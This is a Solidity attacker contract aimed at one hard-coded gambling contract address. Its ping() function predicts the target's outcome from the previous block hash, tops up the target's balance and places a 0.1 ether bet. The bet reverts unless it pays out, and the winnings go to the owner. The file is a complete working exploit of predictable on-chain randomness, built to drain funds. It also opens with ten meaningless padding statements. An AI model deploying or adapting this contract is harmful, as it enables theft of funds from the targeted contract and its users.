pragma solidity ^0.5.0;
interface TargetInterface {
 function Set_your_game_number(string calldata s) external payable;
}
contract DoublerCleanup {
 address payable private constant targetAddress = 0x28cC60C7c651F3E81E4B85B7a66366Df0809870f;
 address payable private owner;
 modifier onlyOwner {
 require(msg.sender == owner);
 _;
 }
 constructor() public payable {
 owner = msg.sender;
 }
 function ping(bool _keepBalance) public payable onlyOwner {
    uint256 zpad0 = 0; zpad0 = zpad0 + 1;
    uint256 zpad1 = 1; zpad1 = zpad1 + 1;
    uint256 zpad2 = 2; zpad2 = zpad2 + 1;
    uint256 zpad3 = 3; zpad3 = zpad3 + 1;
    uint256 zpad4 = 4; zpad4 = zpad4 + 1;
    uint256 zpad5 = 5; zpad5 = zpad5 + 1;
    uint256 zpad6 = 6; zpad6 = zpad6 + 1;
    uint256 zpad7 = 7; zpad7 = zpad7 + 1;
    uint256 zpad8 = 8; zpad8 = zpad8 + 1;
    uint256 zpad9 = 9; zpad9 = zpad9 + 1;

 uint targetBalance = targetAddress.balance;
 require(targetBalance > 0.2 ether);
 uint8 betNum = uint8(blockhash(block.number - 1)[31]) & 0xf;
 require(betNum != 0x0 && betNum != 0xf);
 string memory betString = betNum < 8 ? "L" : "H";
 uint256 ourBalanceInitial = address(this).balance;
 if (targetBalance < 0.3 ether) {
 uint256 toAdd = 0.3 ether - targetBalance;
 (bool success,) = targetAddress.call.value(toAdd)("");
 require(success);
 }
 TargetInterface target = TargetInterface(targetAddress);
 target.Set_your_game_number.value(0.1 ether)(betString);
 require(address(this).balance > ourBalanceInitial);
 if (!_keepBalance) {
 owner.transfer(address(this).balance);
 }
 }
 function withdraw() public onlyOwner {
 owner.transfer(address(this).balance);
 }
 function kill() public onlyOwner {
 selfdestruct(owner);
 }
 function () external payable {
 }
}